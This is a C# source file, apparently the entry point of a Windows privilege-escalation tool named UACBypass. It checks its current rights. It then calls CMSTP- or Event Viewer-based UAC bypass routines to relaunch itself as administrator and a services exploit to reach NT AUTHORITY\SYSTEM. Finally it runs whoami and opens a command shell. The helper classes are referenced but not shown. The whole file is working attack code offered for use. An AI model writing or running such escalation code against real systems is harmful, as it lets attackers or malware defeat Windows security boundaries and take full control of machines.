using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
namespace UACBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            EVENTVWRBypass.CleanRegistry();

            Console.WriteLine("running as admin? " + (Win32.IsRunAsAdmin() ? "yes" : "no"));
            Console.WriteLine("running as system? " + (Win32.IsRunAsSystem() ? "yes" : "no"));

            if (!Win32.IsRunAsAdmin())
            {
                Console.WriteLine("=> Privileges Escalation");
                Console.WriteLine("Bypassing UAC....");

                //make a privilege escalation to get admin rights
                if(OsSupport.IsTenOrBetter)
                    CMSTPBypass.AutoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
                else EVENTVWRBypass.AutoElevate(System.Reflection.Assembly.GetExecutingAssembly().Location);
            }
            else if(System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem)
            {
                Console.WriteLine("sucessfully bypass all Windows Privileges");

                //check if the username
                Process p = new Process();
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.FileName = "whoami";
                p.Start();
                p.WaitForExit();
                Console.WriteLine(p.StandardOutput.ReadToEnd());

                //start a new windows shell
                Process.Start("cmd.exe");
            }
            else 
            {
                Console.WriteLine("=> System Privileges Escalation");
                Console.WriteLine("using Services Exploit....");

                //make a privilege escalation to get system rights (works only if is already running as admin), so we need to run as admin first.
                systemPrivBypass.startAsNTAuthoritySystem(System.Reflection.Assembly.GetExecutingAssembly().Location);
            }     
        }
    }
}
